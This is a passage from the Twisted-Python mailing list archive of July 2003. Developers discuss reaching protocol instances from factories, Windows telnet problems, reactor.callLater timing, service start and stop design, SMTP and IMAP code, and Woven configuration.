Following the client howto I created a simple client
using a ClientFactory, like this:

class echo(Protocol):
	def sendMsg(self, data):
		print "sending", data
		self.transport.write(data)

	def dataReceived(self, data):
		...
		...
		msg = "foo"
		self.sendMsg(foo)


So this works fine, however, how can I access the echo.sendMsg
method from outside the class instance? I can't just use echo.sendMsg(..)
because I never seem to have a "handle" for it. Sorry for such a stupid
namespace issue, but I am just learning. :) (I have tried various ways
to get at the method but either get "sendMsg is unbounded" or that the
method requires an instance to it self). 

As always, thank you so much for your time. 

Cheers,

don




From idmaffett at cs.millersville.edu  Mon Jul 14 14:05:43 2003
From: idmaffett at cs.millersville.edu (Ian D Maffett)
Date: Mon, 14 Jul 2003 14:05:43 -0400 (EDT)
Subject: [Twisted-Python] smtp/pop3
Message-ID: <Pine.LNX.4.44.0307141404000.4117-100000@cs.millersville.edu>

Hello,

I'm a newbie to all of this.  My boss is exploring using python for
various tasks.  We were wondering is if there is an easy way to set up
SMTP/POP3 servers and accounts using twisted?  Are there any examples (not
asking for the solution).

Thanks,
Ian




From Rudy.Schockaert at pandora.be  Mon Jul 14 14:39:04 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Mon, 14 Jul 2003 20:39:04 +0200
Subject: [Twisted-Python] Problem with Twisted on Windows XP
Message-ID: <3F12F8C8.7040709@pandora.be>

Hi all,

I got very excited last month when I learned more about Twisted @ 
EuroPython. Now that I finally have some free time, I wanted to learn 
how to use it.
I'm working on Windows XP with Python 2.2.2 and Twisted 1.0.5 and 1.0.6.
As I am reading through the HOWTOs I wanted to try out each example.
Already at the first example I'm having problems.
I ran mktap.py telnet -p 4040 | -u admin -w admin.
Then I ran twistd.py -f telnet.tap and the application seems to run.
When I telnet to port 4040 on localhost I get a prompt for the username 
and for the password. After entering them I don't get a Python prompt at 
all.

Am I doing something wrong? Don't all parts of twisted run on Windows? 
If so, what does and what doesn't?

Thanks in advance,

Rudy
|
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030714/b59f932c/attachment.htm 

From itamar at itamarst.org  Mon Jul 14 14:34:00 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 14 Jul 2003 14:34:00 -0400
Subject: [Twisted-Python] Accessing ClientFactory methods?
In-Reply-To: <FPEBLIAFGDEEOHHAGOKBIEBECCAA.don@motorola.com>
References: <20030714082506.891.qmail@green.zadka.com>
	<FPEBLIAFGDEEOHHAGOKBIEBECCAA.don@motorola.com>
Message-ID: <20030714143400.2a9232ef.itamar@itamarst.org>

On Mon, 14 Jul 2003 12:53:38 -0500
"Don Hiatt" <don at motorola.com> wrote:

> So this works fine, however, how can I access the echo.sendMsg
> method from outside the class instance? I can't just use
> echo.sendMsg(..) because I never seem to have a "handle" for it. Sorry
> for such a stupid namespace issue, but I am just learning. :) (I have
> tried various ways to get at the method but either get "sendMsg is
> unbounded" or that the method requires an instance to it self). 

This is a design issue I've been wrestling with. One way to do it is
have a method on the factory that the protocol calls in connectionMade
with itself, and then the logic for sending commands to the client is in
the factory.

Another solution is t.i.protocol.ClientCreator, that lets you get back a
Deferred of the protocol instance.

Any other solutions that people have found? I'd like to be able to make
a single, canonical clean way for doing this.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From itamar at itamarst.org  Mon Jul 14 14:37:12 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 14 Jul 2003 14:37:12 -0400
Subject: [Twisted-Python] Problem with Twisted on Windows XP
In-Reply-To: <3F12F8C8.7040709@pandora.be>
References: <3F12F8C8.7040709@pandora.be>
Message-ID: <20030714143712.536b9a0e.itamar@itamarst.org>

On Mon, 14 Jul 2003 20:39:04 +0200
Rudy Schockaert <Rudy.Schockaert at pandora.be> wrote:

> I ran mktap.py telnet -p 4040 | -u admin -w admin.
> Then I ran twistd.py -f telnet.tap and the application seems to run.
> When I telnet to port 4040 on localhost I get a prompt for the
> username and for the password. After entering them I don't get a
> Python prompt at all.

Are you using the Windows telnet client? it is very very broken. Does
this work with PuTTy? Do you get a traceback in the log?

> Am I doing something wrong? Don't all parts of twisted run on Windows?
> 

Yes, they should run just fine. If they don't it's a bug.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From warner at lothar.com  Mon Jul 14 15:11:05 2003
From: warner at lothar.com (Brian Warner)
Date: Mon, 14 Jul 2003 12:11:05 -0700 (PDT)
Subject: [Twisted-Python] Accessing ClientFactory methods?
References: <20030714082506.891.qmail@green.zadka.com>
 <FPEBLIAFGDEEOHHAGOKBIEBECCAA.don@motorola.com>
 <20030714143400.2a9232ef.itamar@itamarst.org>
Message-ID: <20030714.121105.11712562.warner@lothar.com>

> Any other solutions that people have found? I'd like to be able to make
> a single, canonical clean way for doing this.

I'm not sure that a single technique can be found, because the problem is
going to be different for every application.

The Protocol instance represents a single connection to a single client. You
could have dozens of these connections happening at the same time. From
outside the Protocol object, which one do you want to send a message to? Who
is deciding to send a message to them?

I see two general possibilities:

 The connections are like login sessions to a shell. Each one has some state
 that is scoped to the connection (it goes away when the connection is
 dropped). Messages sent out through the connection are triggered by actions
 caused by commands that came in through the same connection. "/bin/ls"
 results in some text being returned.

   In this case, either the state can be stored in the Protocol subclass, or
   in a companion object which is associated at login time (in the
   connectionMade method).

     class echo(Protocol):
         def connectionMade(self):
             self.session = NewSession()
         def dataReceived(self, data):
             # buffer data, look for command, parse it
             self.session.doCommand(command, self)
         def sendMsg(self, data):
             self.transport.write(data)

   In this scheme, each command gets a handle which it can use to send data
   back to the user. You might also want to give that handle to
   NewSession(), so it can send data to the user at any time (think of the
   unix 'write' command). There might be other tables where the Protocol
   reference needs to be added: a list of connections for each username, a
   list of connections for each MUD player who is in a particular room, a
   list of connections using a particular database.

   Finally, you might also want to keep a global list of all connections (to
   implement the unix 'wall' command which sends a message to *everybody*
   logged in):

     class echo(Protocol):
         def connectionMade(self):
             self.factory.allConnections.append(self)
         def connectionLost(self, reason):
             self.factory.allConnections.remove(self)
     class echofactory(Factory):
         allConnections = []
         def broadcastMsg(self, msg):
             for p in self.allConnections:
                 p.sendMsg(msg)

 The other general scheme would be to allow only a single connection at a
 time. This removes the question of "which one do you want to talk to". Then
 you can store the Protocol instance in the Factory, the Application, or
 even as a global.
           
     class echo(Protocol):
         def connectionMade(self):
             global TheConnection
             assert(TheConnection == None)
             TheConnection = self
         def connectionLost(self, reason):
             global TheConnection
             TheConnection = None
     def sendMessage(msg):
         TheConnection.sendMsg(msg)


Thinking about the issue in terms of multiple simultaneous connections and
how do you decide *which* you want to talk to might make it easier to answer
the question of where to store the Protocol reference.

hope that helps,
 -Brian



From Rudy.Schockaert at pandora.be  Mon Jul 14 15:25:33 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Mon, 14 Jul 2003 21:25:33 +0200
Subject: [Twisted-Python] Problem with Twisted on Windows XP
In-Reply-To: <20030714143712.536b9a0e.itamar@itamarst.org>
References: <3F12F8C8.7040709@pandora.be> <20030714143712.536b9a0e.itamar@itamarst.org>
Message-ID: <3F1303AD.9080102@pandora.be>


>
>Are you using the Windows telnet client? it is very very broken. Does
>this work with PuTTy? Do you get a traceback in the log?
>
>  
>
Thanks you very much Itamar. It is indeed that crappy WIndows telnet 
client. I should have known better.
Wouldn't it be a good idea to mention this in the docs? 

I didn't get any traceback, but after hitting a few times CTRL-J I got a 
connection lost.

Best regards,

Rudy


-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030714/98886cfb/attachment.htm 

From rich at enflyer.com  Mon Jul 14 15:32:32 2003
From: rich at enflyer.com (Rich Cavanaugh)
Date: Mon, 14 Jul 2003 15:32:32 -0400
Subject: [Twisted-Python] woven.guard patch for "Issue72"
Message-ID: <E9A3BF31-B631-11D7-9D9A-000A95890854@enflyer.com>

This is a minor patch that solves tge webhappyrealm.py problem 
referenced here:
http://twistedmatrix.com/users/roundup.twistd/twisted/issue72

-------------- next part --------------
A non-text attachment was scrubbed...
Name: guard.py.patch
Type: application/octet-stream
Size: 679 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030714/755ac089/attachment.obj 
-------------- next part --------------


rich

From itamar at itamarst.org  Mon Jul 14 15:29:21 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 14 Jul 2003 15:29:21 -0400
Subject: [Twisted-Python] Problem with Twisted on Windows XP
In-Reply-To: <3F1303AD.9080102@pandora.be>
References: <3F12F8C8.7040709@pandora.be>
	<20030714143712.536b9a0e.itamar@itamarst.org>
	<3F1303AD.9080102@pandora.be>
Message-ID: <20030714152921.4c01fed5.itamar@itamarst.org>

On Mon, 14 Jul 2003 21:25:33 +0200
Rudy Schockaert <Rudy.Schockaert at pandora.be> wrote:

> Thanks you very much Itamar. It is indeed that crappy WIndows telnet 
> client. I should have known better.
> Wouldn't it be a good idea to mention this in the docs? 

Well, then we'd have to make a list of all the ways Windows sucks in
every document we wrote, and that would be far too time consuming.

Anyway, does it work with PuTTy? If not we may have a bug. And I suppose
working with windows telnet client is a semi-worthwhile goal. Add an
issue to the bug tracker perhaps? http://twistedmatrix.com/bugs/

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From itamar at itamarst.org  Mon Jul 14 15:32:09 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 14 Jul 2003 15:32:09 -0400
Subject: [Twisted-Python] woven.guard patch for "Issue72"
In-Reply-To: <E9A3BF31-B631-11D7-9D9A-000A95890854@enflyer.com>
References: <E9A3BF31-B631-11D7-9D9A-000A95890854@enflyer.com>
Message-ID: <20030714153209.18fe3e83.itamar@itamarst.org>

On Mon, 14 Jul 2003 15:32:32 -0400
Rich Cavanaugh <rich at enflyer.com> wrote:

> This is a minor patch that solves tge webhappyrealm.py problem 
> referenced here:
> http://twistedmatrix.com/users/roundup.twistd/twisted/issue72

Why not add the patch to the issue tracker? It supports file
attachements I think.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From peter at engcorp.com  Mon Jul 14 15:53:13 2003
From: peter at engcorp.com (Peter Hansen)
Date: Mon, 14 Jul 2003 15:53:13 -0400
Subject: [Twisted-Python] Problem with Twisted on Windows XP
References: <3F12F8C8.7040709@pandora.be>
		<20030714143712.536b9a0e.itamar@itamarst.org>
		<3F1303AD.9080102@pandora.be> <20030714152921.4c01fed5.itamar@itamarst.org>
Message-ID: <3F130A29.41EFF3DA@engcorp.com>

Itamar Shtull-Trauring wrote:
> 
> On Mon, 14 Jul 2003 21:25:33 +0200
> Rudy Schockaert <Rudy.Schockaert at pandora.be> wrote:
> 
> > Thanks you very much Itamar. It is indeed that crappy WIndows telnet
> > client. I should have known better.
> > Wouldn't it be a good idea to mention this in the docs?
> 
> Well, then we'd have to make a list of all the ways Windows sucks in
> every document we wrote, and that would be far too time consuming.

At least a reference to specifics about the ways in which the 
crappy Windows telnet client sucks would be helpful, at least
for the archives.  This is the first I've heard of it, and I've
experienced only minor annoyances, never actual defects.  I'm
good at working around Windows suckiness, though, so maybe that's
why it never much bothered me.

Anyway, is there a good page that covers the "very very broken"
nature of Windows telnet?  (Uncharacteristically being too lazy
to google, but I've got a meeting in two minutes.)

-Peter



From rich at enflyer.com  Mon Jul 14 15:59:17 2003
From: rich at enflyer.com (Rich Cavanaugh)
Date: Mon, 14 Jul 2003 15:59:17 -0400
Subject: [Twisted-Python] woven.guard patch for "Issue72"
In-Reply-To: <20030714153209.18fe3e83.itamar@itamarst.org>
Message-ID: <A6DFCA50-B635-11D7-9D9A-000A95890854@enflyer.com>

On Monday, July 14, 2003, at 03:32 PM, Itamar Shtull-Trauring wrote:

> On Mon, 14 Jul 2003 15:32:32 -0400
> Rich Cavanaugh <rich at enflyer.com> wrote:
>
>> This is a minor patch that solves tge webhappyrealm.py problem
>> referenced here:
>> http://twistedmatrix.com/users/roundup.twistd/twisted/issue72
>
> Why not add the patch to the issue tracker? It supports file
> attachements I think.

I figured only the core twisted developers could post to it. It's added 
to the tracker now though.

rich




From itamar at itamarst.org  Mon Jul 14 16:13:12 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 14 Jul 2003 16:13:12 -0400
Subject: [Twisted-Python] woven.guard patch for "Issue72"
In-Reply-To: <A6DFCA50-B635-11D7-9D9A-000A95890854@enflyer.com>
References: <20030714153209.18fe3e83.itamar@itamarst.org>
	<A6DFCA50-B635-11D7-9D9A-000A95890854@enflyer.com>
Message-ID: <20030714161312.318fe6f2.itamar@itamarst.org>

On Mon, 14 Jul 2003 15:59:17 -0400
Rich Cavanaugh <rich at enflyer.com> wrote:

> I figured only the core twisted developers could post to it. It's
> added to the tracker now though.

Nope, anyone can post - we want other people to do so! (thanks for
writing and submitting the patch.)

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From Rudy.Schockaert at pandora.be  Mon Jul 14 16:32:30 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Mon, 14 Jul 2003 22:32:30 +0200
Subject: [Twisted-Python] Problem with Twisted on Windows XP
In-Reply-To: <20030714152921.4c01fed5.itamar@itamarst.org>
References: <3F12F8C8.7040709@pandora.be>	<20030714143712.536b9a0e.itamar@itamarst.org>	<3F1303AD.9080102@pandora.be> <20030714152921.4c01fed5.itamar@itamarst.org>
Message-ID: <3F13135E.6080401@pandora.be>

Itamar Shtull-Trauring wrote:

>On Mon, 14 Jul 2003 21:25:33 +0200
>Rudy Schockaert <Rudy.Schockaert at pandora.be> wrote:
>
>  
>
>>Thanks you very much Itamar. It is indeed that crappy WIndows telnet 
>>client. I should have known better.
>>Wouldn't it be a good idea to mention this in the docs? 
>>    
>>
>
>Well, then we'd have to make a list of all the ways Windows sucks in
>every document we wrote, and that would be far too time consuming.
>
>Anyway, does it work with PuTTy? If not we may have a bug. And I suppose
>working with windows telnet client is a semi-worthwhile goal. Add an
>issue to the bug tracker perhaps? http://twistedmatrix.com/bugs/
>
>  
>
Yes, it works great. I only found out something funny. When  I type 
help() suddenly all the interaction happens in the command prompt window 
where I started twistd.py .
After CTRL-Z and enter, control returns to putty.

I created the bug in Issues.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030714/19c44024/attachment.htm 

From ritchie at ipowerhouse.com  Mon Jul 14 22:02:55 2003
From: ritchie at ipowerhouse.com (ritchie turner)
Date: Mon, 14 Jul 2003 19:02:55 -0700
Subject: [Twisted-Python] reactor.callLater
Message-ID: <3F1360CF.2090602@ipowerhouse.com>

Hi All

I"m a twisted newbie, and I'd like to know why reactor.callLater
doesn't seem to work when called from the Factory __init__ method,
but it does work if I call it from a regular protocol. I'm trying to set up
a broadcast to all protocalls and am using callLater to schedule a timed
broadcast.

Thanks for any help

R





From dp at twistedmatrix.com  Mon Jul 14 20:39:52 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Mon, 14 Jul 2003 17:39:52 -0700
Subject: [Twisted-Python] Woven and deferred models
In-Reply-To: <F9D6CFE4-B612-11D7-9D9A-000A95890854@enflyer.com>
References: <F9D6CFE4-B612-11D7-9D9A-000A95890854@enflyer.com>
Message-ID: <D94311A9-B65C-11D7-BF50-000A95864FC4@twistedmatrix.com>

On Monday, July 14, 2003, at 8:51AM, Rich Cavanaugh wrote:

> I spent some time in #twisted this weekend looking for a solution to 
> this and got some very helpful advice from phed and radix but no real 
> solution to what looks like a bug.
>
> The attached rpy is an example of what I'm trying to do. As is woven 
> doesn't even touch the child nodes of my model="main" tag. Add 
> view="None" and it at least gives me a trace-back on model="name" 
> which is a step beyond not touching it at all.

The solution is to use view="Widget" instead of view="None", which maps 
to DefaultWidget, which does nothing at all. Widget at least has a 
minimal amount of code, including the Deferred-model handling code. I 
will try to fix DefaultWidget so that people are not surprised by 
things like this any more.

>
> If anyone has a better approach to this problem I'd appreciate the 
> input. Basically I have some models that will take some time to fully 
> initialize due to lots of database activity. The sub-models need all 
> of this data in place. I'm trying to find a way to fully initialize a 
> model before woven continues on to it's sub-models.

This is exactly what Deferred-Model handling was written for, so you 
are doing it "correctly" :-)




From andrew-twisted at puzzling.org  Mon Jul 14 20:46:56 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 15 Jul 2003 10:46:56 +1000
Subject: [Twisted-Python] reactor.callLater
In-Reply-To: <3F1360CF.2090602@ipowerhouse.com>
References: <3F1360CF.2090602@ipowerhouse.com>
Message-ID: <20030715004656.GA344@frobozz>

On Mon, Jul 14, 2003 at 07:02:55PM -0700, ritchie turner wrote:
> Hi All
> 
> I"m a twisted newbie, and I'd like to know why reactor.callLater
> doesn't seem to work when called from the Factory __init__ method,
> but it does work if I call it from a regular protocol. I'm trying to set up
> a broadcast to all protocalls and am using callLater to schedule a timed
> broadcast.

In general, you should use startFactory for this, rather than __init__, to
support persistence.  If you are using Twisted's plugin infrastructure
(mktap and twistd), then __init__ will be called at mktap time, which is too
early.  If you override the startFactory method instead, it should work --
startFactory is called when the factory is started, rather than when it is
created.

[Hmm... perhaps mktap should do as trial does, and check that the reactor
has no pending timed calls before exiting?  A warning about this sort of
thing could be useful.]

-Andrew.




From ritchie at ipowerhouse.com  Tue Jul 15 00:15:05 2003
From: ritchie at ipowerhouse.com (ritchie turner)
Date: Mon, 14 Jul 2003 21:15:05 -0700
Subject: [Twisted-Python] reactor.callLater
In-Reply-To: <20030715004656.GA344@frobozz>
References: <3F1360CF.2090602@ipowerhouse.com> <20030715004656.GA344@frobozz>
Message-ID: <3F137FC9.5050704@ipowerhouse.com>

Thx, that works well.

R

Andrew Bennetts wrote:

>On Mon, Jul 14, 2003 at 07:02:55PM -0700, ritchie turner wrote:
>  
>
>>Hi All
>>
>>I"m a twisted newbie, and I'd like to know why reactor.callLater
>>doesn't seem to work when called from the Factory __init__ method,
>>but it does work if I call it from a regular protocol. I'm trying to set up
>>a broadcast to all protocalls and am using callLater to schedule a timed
>>broadcast.
>>    
>>
>
>In general, you should use startFactory for this, rather than __init__, to
>support persistence.  If you are using Twisted's plugin infrastructure
>(mktap and twistd), then __init__ will be called at mktap time, which is too
>early.  If you override the startFactory method instead, it should work --
>startFactory is called when the factory is started, rather than when it is
>created.
>
>[Hmm... perhaps mktap should do as trial does, and check that the reactor
>has no pending timed calls before exiting?  A warning about this sort of
>thing could be useful.]
>
>-Andrew.
>
>
>_______________________________________________
>Twisted-Python mailing list
>Twisted-Python at twistedmatrix.com
>http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>
>  
>





From abe at fettig.net  Mon Jul 14 22:33:44 2003
From: abe at fettig.net (Abe Fettig)
Date: 14 Jul 2003 22:33:44 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <20030712230505.27817.qmail@green.zadka.com>
References: <1058035798.1298.18.camel@mingus>
	 , <1058025187.933.51.camel@mingus> , <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii> <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
Message-ID: <1058236423.6090.5.camel@mingus>

On Sat, 2003-07-12 at 19:05, Moshe Zadka wrote:
> Note that your service has a bug if .startService() is called
> twice without an intervening stopService(), and you present
> here for users an ability to tickle that bug. You can probably
> work around in many ways...
> 
> ...but I prefer to having non-parents .enable() or .disable()
> the service. Of course, it can start enabled by default, but
> this way you have a clear distinction which methods are supposed
> to be called by whom.

Hmm, I guess I don't quite understand this.  Why should it matter if a
services is being started by the parent or not?  Is there a chance the
parent could think the service was still running when it really wasn't?

This is an important point to me as I like the idea of letting
administrators turn services on and off without stopping the
application.

> If you call it "application" insteadof "myApp", the next line
> is not needed: instead of "Python"ing it, "twistd -y" it
> [or maybe twistd -ny if you don't want forking]

If I do this, I get an error on shutdown, as it tries to create a
snapshot of the running app:

2003/07/14 22:22 EDT [*Test App*] Saving Test App application to Test
App-shutdown.tap...
2003/07/14 22:22 EDT [*Test App*] Traceback (most recent call last):
          File
"/usr/lib/python2.2/site-packages/twisted/python/context.py", line 32,
in callWithContext
            return func(*args,**kw)
          File
"/usr/lib/python2.2/site-packages/twisted/internet/default.py", line
122, in run
            self.mainLoop()
          File
"/usr/lib/python2.2/site-packages/twisted/internet/default.py", line
130, in mainLoop
            self.runUntilCurrent()
          File
"/usr/lib/python2.2/site-packages/twisted/internet/base.py", line 368,
in runUntilCurrent
            call.func(*call.args, **call.kw)
        --- <exception caught here> ---
          File
"/usr/lib/python2.2/site-packages/twisted/internet/base.py", line 289,
in _continueSystemEvent
            callable(*args, **kw)
          File
"/usr/lib/python2.2/site-packages/twisted/internet/app.py", line 784, in
_afterShutDown
            self.save("shutdown")
          File
"/usr/lib/python2.2/site-packages/twisted/internet/app.py", line 745, in
save
            dumpFunc(self, f)
          File
"/usr/lib/python2.2/site-packages/twisted/internet/app.py", line 727, in
dumpFunc
            _dump(obj, file, 1)
        cPickle.PicklingError: Can't pickle
__builtin__.ServiceWebManager: it's not found as
__builtin__.ServiceWebManager

Do you know how to fix this?

Thanks,
Abe





From m at moshez.org  Mon Jul 14 23:22:07 2003
From: m at moshez.org (Moshe Zadka)
Date: 15 Jul 2003 03:22:07 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <1058236423.6090.5.camel@mingus>
References: <1058236423.6090.5.camel@mingus>, <1058035798.1298.18.camel@mingus>
	 , <1058025187.933.51.camel@mingus> , <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii> <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
Message-ID: <20030715032207.14067.qmail@green.zadka.com>

On 14 Jul 2003, Abe Fettig <abe at fettig.net> wrote:

> Hmm, I guess I don't quite understand this.  Why should it matter if a
> services is being started by the parent or not?  Is there a chance the
> parent could think the service was still running when it really wasn't?

Yes.
The parent *will* call .startService/.stopService when it is appropriate.
So either make those callable twice in a row [unlike your example,
where it had a subtle bug in that case] or, better, use something orthogonal
like .enable/.disable. The advantage of .enable/.disable is that they
can keep in the service an attribute of "enabling desired" so that if
you restart the server, the service will stay disabled. Just make sure
__init__ sets .enabled=1, and have .startService check .enabled before
doing anything, etc...

> If I do this, I get an error on shutdown, as it tries to create a
> snapshot of the running app:

To avoid creating snapshorts, use the --no_save argument to twistd.

>         cPickle.PicklingError: Can't pickle
> __builtin__.ServiceWebManager: it's not found as
> __builtin__.ServiceWebManager

A better way, after you're beyond simply examples, is to put the
classes in a module. Even if you don't use the snapshots, they are
sometimes useful for post-mortem debugging.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From m at moshez.org  Mon Jul 14 23:22:07 2003
From: m at moshez.org (Moshe Zadka)
Date: 15 Jul 2003 03:22:07 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <1058236423.6090.5.camel@mingus>
References: <1058236423.6090.5.camel@mingus>, <1058035798.1298.18.camel@mingus>
	 , <1058025187.933.51.camel@mingus> , <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii> <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
Message-ID: <20030715032207.14067.qmail@green.zadka.com>

On 14 Jul 2003, Abe Fettig <abe at fettig.net> wrote:

> Hmm, I guess I don't quite understand this.  Why should it matter if a
> services is being started by the parent or not?  Is there a chance the
> parent could think the service was still running when it really wasn't?

Yes.
The parent *will* call .startService/.stopService when it is appropriate.
So either make those callable twice in a row [unlike your example,
where it had a subtle bug in that case] or, better, use something orthogonal
like .enable/.disable. The advantage of .enable/.disable is that they
can keep in the service an attribute of "enabling desired" so that if
you restart the server, the service will stay disabled. Just make sure
__init__ sets .enabled=1, and have .startService check .enabled before
doing anything, etc...

> If I do this, I get an error on shutdown, as it tries to create a
> snapshot of the running app:

To avoid creating snapshorts, use the --no_save argument to twistd.

>         cPickle.PicklingError: Can't pickle
> __builtin__.ServiceWebManager: it's not found as
> __builtin__.ServiceWebManager

A better way, after you're beyond simply examples, is to put the
classes in a module. Even if you don't use the snapshots, they are
sometimes useful for post-mortem debugging.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From exarkun at intarweb.us  Tue Jul 15 00:18:47 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Tue, 15 Jul 2003 00:18:47 -0400
Subject: [Twisted-Python] Changes to twisted.mail
Message-ID: <20030715041847.GA29473@intarweb.us>

  This evening I checked in a fair number of changes to twisted.mail and
twisted.protocols.smtp.  Much of it was to take advantage of the features
I've recently added to Twisted's SMTP support (such as ESMTP AUTH), but a
fair amount was to clarify, simplify, and generally clean up the interfaces
used by this part of Twisted.

  Wherever possible, I have left in checks for the old behavior which issue
deprecation warnings and "upgrade" the data to the new requirements.  I hope
I have covered all the cases, but since the previous interface wasn't as
precisely specified as one might hope, and maybe because I just plain made
some mistakes, it is possible that these changes will break existing code
that uses the interfaces.

  Understandably, this backwards compatibility complicates the mail code --
extremely in some places -- and I would like to remove it as quickly as
possible.  Feedback on timeline requirements from anyone using this code
would be appreciated.

  So, this is a heads up.  I hope anyone who is seriously using Twisted's
mail code can test their projects against current CVS HEAD and let me know
if I've broken something.  Test cases that codify the old, now broken,
behavior are most welcome (well, patches that *fix* the breakage are even
more welcome ;), but tracebacks might get you some assistance too.

  Enjoy,

  Jp

-- 
Examinations are formidable even to the best prepared, for
even the greatest fool may ask more the the wisest man can answer.
                -- C.C. Colton
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030715/9980078c/attachment.pgp 

From iko at cd.chalmers.se  Tue Jul 15 08:42:56 2003
From: iko at cd.chalmers.se (Anders Hammarquist)
Date: Tue, 15 Jul 2003 14:42:56 +0200
Subject: [Twisted-Python] IMAP BODYSTRUCTURE format & the email.Messages 
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F130212AAFE@its-xchg4.massey.ac.nz> 
References: <1ED4ECF91CDED24C8D012BCF2B034F130212AAFE@its-xchg4.massey.ac.nz> 
Message-ID: <200307151242.h6FCgud24631@haddock.cd.chalmers.se>

In a message of Fri, 11 Jul 2003 18:14:07 +1200, "Tony Meyer" writes:
>Does anyone know of existing code to convert/format/flatten an email.Message
>into the correct format for IMAP's BODYSTRUCTURE request?  (it basically
>breaks down all the MIME parts of the message).  It can use twisted or
>imaplib, or neither, I don't care.

This is intended to be used from Twisted's imap server, but can probably
be adapted to other uses. It probably doesn't work out-of-the box (as I've
adapted it from a larger piece of code, and it's not a runnable example),
but it does produce something at least resembling what the RFC says it
should look like. Usage: You call getBody() from within IMailbox.fetch(),
setting ext to True if it is a BODYSTRUCTURE fetch. (self is a private
Message-type class, not the IMailbox, though it could probably be.)

Enjoy (and please let me know of any bugs in it).

/Anders

-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: text/x-python
Size: 4191 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030715/b11aa66d/attachment.py 
-------------- next part --------------
-- 
 -- Of course I'm crazy, but that doesn't mean I'm wrong.
Anders Hammarquist                                  | iko at cd.chalmers.se
Physics student, Chalmers University of Technology, | Hem: +46 31 88 48 50
G|teborg, Sweden.           RADIO: SM6XMM and N2JGL | Mob: +46 707 27 86 87

From mesozoic at polynode.com  Tue Jul 15 11:47:05 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Tue, 15 Jul 2003 11:47:05 -0400
Subject: [Twisted-Python] Fear and Loathing in Twisted Web and Woven
Message-ID: <20030715154705.GN13205@polynode.com>

I have a specific question and a more general plea for help here, in that
order:

1) I'd like to set certain configuration elements of my site (like "site name",
"template directory", etc.) within my root .rpy, then read them in my Page
classes, wmfactory_* methods, and so forth. Donovan suggested I look at the
registry or the request.site objects, and that advice is as far as I've
gotten.

The registry, as far as I can tell, is not passed to child objects returned
by static.File.getChild. So I'm not sure how I could access that from
within my own classes.

The request, on the other hand, is not accessible from the .rpy. I've tried
registry.getComponent(server.Site) and registry.getComponent(server.Request)
and they both return None. So I'm lost.

Am I simply taking the wrong approach (again) to what I'm trying to do? My
current workaround is to put 'child.registry=self.registry' in
static.File.getChild, before it returns child, but this is a kludge and I
know it.

2) In general, I'm not sure how to write my app anymore, and could use some
help. If you have a minute to read, here's a more about what I'm doing:

I've been using .trp files to store my data, and some have asked me why. I
have complicated data that represents pages on my site. Photo albums, link
collections, etc. I would like to store this data as part of a flat file
hierarchy, so that it resides alongside .html, .stxt, .jpg, and so forth.

I also didn't want to pickle my models; this has caused problems in the
past. So I have Data classes, which are adapted to IModel and IResource with
my custom Model and Page classes (respectively). I store the data files as
.trp, and when somebody navigates to /foo/bar.trp, whichever adapter I've
specified in code is automatically used. I like this; it avoids having to
write static.File processors, which are in my opinion ugly (and not very
scalable).

I am open to suggestions and comments. My goal is to have a flexible code
base on top of which I can expand my personal page, while keeping everything
within a single directory. If this is a pipe dream, and I should be writing
PhotoAlbumContainers and creating them in my root .rpy and moving my links
